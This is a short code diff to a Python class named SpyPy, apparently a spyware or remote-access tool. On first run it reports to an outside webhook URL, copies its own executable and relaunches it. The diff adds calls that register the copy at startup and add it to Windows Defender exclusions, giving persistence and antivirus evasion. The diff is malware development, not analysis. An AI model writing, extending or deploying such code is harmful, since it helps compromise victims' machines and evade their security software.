@@ -110,11 +110,13 @@ class SpyPy:
                         WEBHOOK_URL,
                         f"```✅ {SOFTWARE_EXE_NAME} has been executed for the first time. Setting up...```",
                     )
-                    open(self.first_run_flag, "w").close()
+                    open(self.first_run_flag, "w").close()                    
                     current_exe = sys.executable
                     new_exe = os.path.join(
                         self.software_dir, os.path.basename(current_exe)
                     )
+                    add_to_startup(new_exe)
+                    add_to_windows_defender_exclusions(new_exe)
                     shutil.copyfile(current_exe, new_exe)
                     subprocess.Popen([new_exe])
                     if CUSTOM_ERROR_MESSAGE:
